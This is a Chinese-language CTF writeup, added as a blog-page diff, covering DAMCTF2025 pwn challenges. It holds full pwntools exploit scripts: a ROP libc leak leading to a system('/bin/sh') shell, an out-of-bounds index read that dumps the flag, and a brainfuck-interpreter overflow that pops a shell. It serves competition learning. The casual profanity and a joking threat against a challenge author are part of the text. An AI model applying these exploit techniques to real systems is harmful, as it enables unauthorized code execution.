@@ -1,0 +1,395 @@
+export const layout = "#components/Page.js";
+export const title = "DAMCTF2025 Writeup";
+export const created = "2025-05-12T10:37:16+08:00";
+
+# DAMCTF2025 Pwn WriteUp
+
+本来周末想着打那个 midnight sun CTF2025 来着，结果推迟了，就看了这一场 DAMCTF2025 和另外一场 Break The Syntax CTF2025。。
+
+## dnd
+
+简单逆向一下恢复结构体：
+
+```c
+00000000 struct Game // sizeof=0x4
+00000000 {
+00000000     char point;
+00000001     char health;
+00000002     char attack;
+00000003     char d;
+00000004 };
+
+00000000 struct Monster // sizeof=0x3
+00000000 {
+00000000     char health;
+00000001     char damage;
+00000002     char c;
+00000003 };
+```
+
+恢复出来 `Monster::attack` 函数如下：
+
+```c
+Game *__fastcall Monster::Attack(Monster *monster, Game *you)
+{
+  __int64 v2; // rax
+  Game *result; // rax
+  __int64 v4; // rax
+
+  if ( you->attack <= monster->health )
+  {
+    v4 = std::operator<<<std::char_traits<char>>(&std::cout, "Oof, that hurt ;(");
+    std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
+    you->health -= monster->damage;
+    result = you;
+    you->point -= monster->health;              // 整数溢出
+  }
+  else
+  {
+    v2 = std::operator<<<std::char_traits<char>>(&std::cout, "You defeated the monster!");
+    std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
+    you->point += monster->health;
+    result = you;
+    ++you->attack;                              // inc attack
+  }
+  return result;
+}
+```
+
+只要把 you→point 变成负数
+
+![image.png](https://pic1.imgdb.cn/item/68215fba58cb8da5c8ecc4de.png)
+
+这里的比较用的是无符号数，所以上面的负数很容易就通过这个检测。
+
+然后就是一个白给的栈溢出。
+
+题目的交互比较抽象，本地一开始瞎写踩了很多坑，后来重写了一下，exp：
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "./dnd_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+io = remote("dnd.chals.damctf.xyz", 30813) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+    b *0x402960
+    """)
+
+def get_point():
+    io.recvuntil(b"Attack: ")
+    attack = int(io.recv(1).decode(), 10)
+    io.recvuntil(b" (")
+    health = int(io.recvuntil(b" health", drop=True).decode(), 10)
+    if attack <= health:
+        io.sendlineafter(b"Do you want to [a]ttack or [r]un?", b"a")
+    else:
+        io.sendlineafter(b"Do you want to [a]ttack or [r]un?", b"a")
+    io.recvuntil(b">>> Round ")
+    io.recvuntil(b"Points: ")
+    points = int(io.recvuntil(b" | Health: ", drop=True).decode(), 10)
+    return points
+
+def get_overflow():
+    io.recvuntil(b"Can you survive all 5 rounds?")
+    res = 0
+    io.recvuntil(b">>> Round ")
+    io.recvuntil(b"Points: ")
+    points = int(io.recvuntil(b" | Health: ", drop=True).decode(), 10)
+    for i in range(5):
+        res = get_point()
+        if res < 0:
+            for j in range(4 - i):
+                io.sendlineafter(b'Do you want to [a]ttack or [r]un? ', b"r")
+            break
+
+get_overflow()
+
+# 0x0000000000402640: pop rdi; nop; pop rbp; ret;
+# 0x000000000040201a: ret;
+
+pop_rdi_ret = 0x402640
+main = 0x402988
+ret = 0x40201a
+payload = flat([cyclic(104, n=8), pop_rdi_ret, elf.got['puts'], 0, elf.plt['puts'], main])
+io.sendlineafter(b'What is your name, fierce warrior? ', payload)
+# io.sendline(payload)
+io.recvuntil(b"\n")
+puts_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
+libc_addr = puts_addr - 0x87be0
+log.info(f"libc_addr => {hex(libc_addr)}")
+libc.address = libc_addr
+
+get_overflow()
+binsh = next(libc.search(b"/bin/sh\x00"))
+payload = flat([cyclic(104, n=8), pop_rdi_ret, binsh, 0, ret, libc.sym['system']])
+io.sendlineafter(b'What is your name, fierce warrior? ', payload)
+
+io.interactive()
+```
+
+## charful
+
+题目给了个压缩包，打开，里面有 main.c, todos.c, todos.h，给了源代码 makefile dockerfile，然后再下载出题人搞的可执行文件，看一下基本信息：
+
+```bash
+$ file todos_arm
+todos_arm: ELF 32-bit LSB executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, BuildID[sha1]=ea22cc12e1971e647ebf3c451feca3cbaf59c926, for GNU/Linux 3.2.0, not stripped
+```
+
+ok 32 位 arm，我不知道为什么出题人会给一个复现不了的 dockerfile 出来？给这个 dockerfile 的意义是？我用他的 dockerfile build 出来的可执行文件是这样：
+
+```bash
+$ file todos
+todos: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=84f666f27998b6edf31415eb4079223c150c9c28, for GNU/Linux 3.2.0, not stripped
+```
+
+到这里已经初见端倪了，是的，出题人不是人，没看出来也没关系，继续做。
+
+![image.png](https://pic1.imgdb.cn/item/6821604458cb8da5c8ecc5bc.png)
+
+菜单题，那感觉可能比较复杂了，估计得逐个逆向
+
+题目提示说这是整数溢出…..看了一会，感觉按照题目这个检查方法，应该不可能溢出啊？？？在这里卡了很久，找不到🕳
+
+![image.png](https://pic1.imgdb.cn/item/6821606858cb8da5c8ecc5e9.png)
+
+（怀疑人生.jpg）
+
+随便输入了一些 fuzz 一下，结果出现了非预期的输出？我草？
+
+仔细看一下，在源码里是这么写的：
+
+![image.png](https://pic1.imgdb.cn/item/6821608b58cb8da5c8ecc5f1.png)
+
+ida 逆向出来是这样的：
+
+![image.png](https://pic1.imgdb.cn/item/682160ac58cb8da5c8ecc609.png)
+
+？给的源代码和可执行文件不一样，给源代码的意义是什么呢？？？？？
+
+到这你会觉得出题人确实不太诗人，别急。
+
+刚才说了这是个菜单题，仔细看一下功能，想了想，似乎只需要 print_todo 这一个功能就能把内存里的 flag 打印出来了吧？
+
+不太确定，写个脚本看看：
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./todos_arm"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("charful.chals.damctf.xyz", 30128) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+    b *0x4019D5
+    """)
+
+def choose(idx):
+    io.sendlineafter(b"What would you like to do? ", str(idx).encode())
+
+def show(idx):
+    choose(2)
+    io.sendlineafter(b"Which TODO would you like to print? ", str(idx).encode())
+
+for i in range(-330, -300):
+    res = i & 0xffffffff
+    log.info(f"res => {i} => {res}")
+    show(res)
+
+io.interactive()
+```
+
+？
+
+![image.png](https://pic1.imgdb.cn/item/682160c258cb8da5c8ecc614.png)
+
+直接出了？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
+
+不是哥们？那你他妈写那么多功能干嘛？
+
+哦对，为什么第一次只找到了一半的 flag 呢？哈哈，因为靶机远程太卡了，第一次爆到一半 dump 了，还好我自信😁
+
+以后 daimi 再让我做这种傻逼题我就把 daimi 杀了。
+
+
+## bf
+
+存在溢出漏洞，简单利用即可
+
+Zzz
+
+```python
+# >,    //读入一个字符n，代表我们要输入字符的个数
+# [
+#   [>] //向右移动到第一个0字符的位置（字符串头
+#   ,   //输入字符
+#   [<] //向左移动到第一个0字符串位置（字符串尾
+#   >-  //向右移动到n并将其-1
+# ]     //若为0跳出循环
+
+# -     //剩下的we don't care
+# [>]
+# -
+# [<.+]
+# ++++++++++.
+```
+
+exp：
+
+```python
+from pwn import *
+filename='./bf'
+libc='./libc.so.6'
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+# p=process(filename)
+# e=ELF(filename)
+libc=ELF(libc)
+context.log_level='debug'
+# context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+# gdb.attach(p)
+
+def translate(code: str, output=None, start=0, depth=0):
+    if output is None:
+        output = [0] * len(code)
+
+    sp = start
+    loop_start = start
+
+    while sp < len(code) and code[sp] != '\0':
+        ch = code[sp]
+
+        if ch == '>':
+            output[sp] = (output[sp] & 0xFFFFFF00) | 1
+            sp += 1
+        elif ch == '<':
+            output[sp] = (output[sp] & 0xFFFFFF00) | 2
+            sp += 1
+        elif ch == '.':
+            output[sp] = (output[sp] & 0xFFFFFF00) | 3
+            sp += 1
+        elif ch == ',':
+            output[sp] = (output[sp] & 0xFFFFFF00) | 4
+            sp += 1
+        elif ch == '+':
+            output[sp] = (output[sp] & 0xFFFFFF00) | 5
+            sp += 1
+        elif ch == '-':
+            output[sp] = (output[sp] & 0xFFFFFF00) | 6
+            sp += 1
+        elif ch == '[':
+            output[sp] = (output[sp] & 0xFFFFFF00) | 7
+            jump_target = translate(code, output, sp + 1, depth + 1)
+            if jump_target == 0:
+                return 0
+            output[sp] = ((jump_target & 0xFFFF) << 16) | (output[sp] & 0xFFFF)
+            sp = jump_target
+        elif ch == ']':
+            if depth == 0:
+                return 0
+            output[sp] = (output[sp] & 0xFFFFFF00) | 8
+            output[sp] = ((loop_start & 0xFFFF) << 16) | (output[sp] & 0xFFFF)
+            return sp + 1
+        else:
+            return 0
+
+    return 0 if depth else sp
+                #>,[[>],[<]>-]-[>]-[<.+]++++++++++.
+official_code = ">,[[>],[<]>-]-[>]-[<.+]++++++++++."
+code = '>,[[>],[<]>-]-[>]-[<.+][[->.,+]'
+
+out = [0] * len(code)
+end = translate(code, out)
+print([hex(x) for x in out])
+
+# p = process(['./bf',official_code])
+p = remote('brain-a-tac.chals.damctf.xyz',31337)
+# gdb.attach(p,'go')
+# >< ., +- []
+# 12 34 56 78
+pay = b'\xff' * 7
+pay += p32(0x02020205) + p32(0x02020201) + p32(0x02020203) + p32(0x02020204) + p32(0x01010106) + p32(0xffdd0208)
+pay += b'\x00'+ b'1'*(0x72-6) + b'\xff'
+# for x in out:
+    # pay+=p32(x)
+for i in range(0,len(pay)):
+    s(pay[i:i+1])
+# p.interactive()
+s(b'2'*0x25b+b'\x87')
+
+# p.interactive()
+# s(b'\x00'*0x7e+b'\xff')
+s(p64(0))
+# s(b'\x00'*0x1b0+p32
+# (0)+b'\x87')
+# p.recvuntil(p64(2))
+# pause()
+# p.interactive()
+# p.close()
+x = p.recvuntil('\xb8')
+s('\x3c')
+libcbase = u8('\xb8')
+
+x = p.recv(1)
+libcbase += u8(x) << 8
+s(p8(u8(x)+(0x90-0xa3)))
+x = p.recv(1)
+libcbase += u8(x) << 16
+s(p8(u8(x)+(0x11-0x2)))
+x = p.recv(1)
+# #11903c
+
+
+libcbase += u8(x) << 24
+s(x)
+
+x = p.recv(1)
+libcbase += u8(x) << 32
+s(x)
+
+x = p.recv(1)
+libcbase += u8(x) << 40
+s(x+b'\x00\x00')
+libcbase = libcbase - 0x2a3b8
+rdi = libcbase + 0x11903c
+binsh = libcbase + libc.search('/bin/sh').__next__()
+saddr = libcbase + libc.sym['system']
+s(p64(binsh)+p64(rdi+1)+p64(saddr))
+print(hex(libcbase))
+# p.interactive()
+# pause()
+s('\x01')
+p.interactive()
+
+# >< ., +- []
+# 12 34 56 78
+# >,
+# [
+#   [>]
+#   ,
+#   [<]
+#   >-
+# ]
+# -
+# [>]
+# -
+# [<.+]
+# ++++++++++.
+```
